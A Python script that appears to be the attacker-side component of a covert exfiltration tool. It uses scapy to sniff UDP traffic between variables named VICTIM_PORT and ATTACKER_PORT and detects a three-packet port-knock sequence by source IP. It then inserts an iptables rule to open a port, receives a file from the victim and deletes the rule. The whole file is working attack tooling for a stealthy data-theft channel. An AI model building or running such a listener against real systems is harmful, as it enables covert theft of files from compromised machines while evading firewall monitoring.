from scapy.all import *
from scapy.layers.inet import IP, UDP
from crypto import *
from config import *
import time
import utils
import subprocess

knock_number = 0
knock_timer =0

def in_time():
    elapsed_time = time.time() - knock_timer
    if elapsed_time < ALLOWED_TIME_BETWEEN_KNOCKS:
        return True
    else:
        return False

def closeport():
    print ("Closing port: " + str(FILE_TRANSFER_PORT))
    command = "iptables -D INPUT -p tcp --destination-port " + str(FILE_TRANSFER_PORT) +  " -j ACCEPT"
    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

def openport():
    print ("Opening port: " + str(FILE_TRANSFER_PORT))
    command = "iptables -I INPUT -p tcp --destination-port " + str(FILE_TRANSFER_PORT) + " -j ACCEPT"
    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

def sniff_knocks(packet):
    print ("Checking packet for knock")
    global knock_number
    global knock_timer
    # If knock_1 rest knock_number and start timer.
    if packet["IP"].src == knock_1:
        print ("Knock 1")
        knock_number = 1
        knock_timer = time.time()
    if packet["IP"].src == knock_2:
        if (knock_number == 1) & (in_time()):
            print ("Knock 2")
            knock_number = 2
            knock_timer = time.time()
        else:
            knock_number = 0
            knock_timer = 0
    if packet["IP"].src == knock_3:
        if (knock_number == 2) & (in_time()):
            print ("Knock 3")
            knock_number = 0
            knock_timer = 0
            print ("Knock, knock, knock.... Opening Ports")
            openport()
            ReceiveFile()
            closeport()

        else:
            knock_number = 0
            knock_timer = 0


def ReceiveFile():
    utils.listen_for_file()


def main():
    print ("Listening for Knocks!")
    sniff(filter="udp and src port " + str(VICTIM_PORT) + " and dst port " + str(ATTACKER_PORT), prn=sniff_knocks)


if __name__ == '__main__':
    main()